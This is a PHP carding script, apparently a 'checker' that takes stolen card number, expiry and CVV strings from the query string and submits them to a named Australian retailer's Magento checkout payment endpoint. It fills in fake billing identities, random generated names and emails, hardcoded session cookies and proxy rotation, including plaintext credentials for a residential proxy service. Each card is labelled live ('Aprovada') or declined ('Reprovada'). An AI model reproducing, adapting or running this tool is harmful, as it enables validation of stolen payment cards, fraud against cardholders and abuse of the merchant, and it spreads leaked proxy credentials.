<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);
$binn = substr($cc,0,6);



if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
  return $email;
}
 function ibuuproxy(){
  $proxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($proxySocks)-1);
   $proxySocks = $proxySocks[$myproxy];
 return $proxySocks;
}


///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($apellido);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$username = 'lum-customer-hl_7873c611-zone-static_res';
$password = 'p8txkzc6mq9h';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);


// echo $binn;



$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);


#req1==============================================================================

// #==========================================================================================================



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.schots.com.au/rest/default/V1/guest-carts/in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9/payment-information');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
 // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: __cfduid=d5fd7816db0595ea6db5c36acea79eb311592325271; PHPSESSID=1f466e93f1b8d1811cfe9b79903fb2e8; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; __zlcmid=yjjDNQvv7TXpfG; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; form_key=EvrmUBXse65QyIQE; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; privateData=%7B%22search%22%3A%22tape%22%7D; private_content_version=628abdd1722f48725f7c3974f8426f88; section_data_ids=%7B%22cart%22%3A1592330150%2C%22customer%22%3A1592330150%2C%22compare-products%22%3A1592330150%2C%22last-ordered-items%22%3A1592330150%2C%22directory-data%22%3A1592330150%2C%22captcha%22%3A1592330150%2C%22wishlist%22%3A1592330150%2C%22instant-purchase%22%3A1592330150%2C%22multiplewishlist%22%3A1592330150%2C%22persistent%22%3A1592330150%2C%22review%22%3A1592330150%2C%22zopim-chat%22%3A1592330150%2C%22recently_viewed_product%22%3A1592330150%2C%22recently_compared_product%22%3A1592330150%2C%22product_data_storage%22%3A1592330150%2C%22paypal-billing-agreement%22%3A1592330150%2C%22checkout-fields%22%3A1592330150%2C%22collection-point-result%22%3A1592330150%2C%22pickup-location-result%22%3A1592330150%7D
',
'origin: https://www.schots.com.au',
'referer: https://www.schots.com.au/checkout/',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9","billingAddress":{"countryId":"AU","regionId":"513","regionCode":"NSW","region":"New South Wales","street":["12 Avenue Road"],"company":"","telephone":"424152448","postcode":"2037","city":"GLEBE","firstname":"Vincnet","lastname":"Warner","saveInAddressBook":0,"save_in_address_book":0,"extension_attributes":{"is_stairs":0}},"paymentMethod":{"method":"migs","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes1.'","cc_number":"'.$cc.'"}},"email":"pubgkittu@gmail.com"}');



$result = curl_exec($ch);



 $message = trim(strip_tags(getstr($result,'"message":"Gateway Error: Declined"')));
// // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));

// // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));

// // // // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));


//  if(strpos($result,'"result":"success"')){
//     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
//    }
// // elseif(strpos($result,'Payment failed: Declined')){
  // echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ NOT SURE BUT MUST BE LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
//   }
// else {

       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';

// updatecart();
// }

curl_close($ch);
ob_flush();
   echo $result;
 // echo $c_pago;
?>
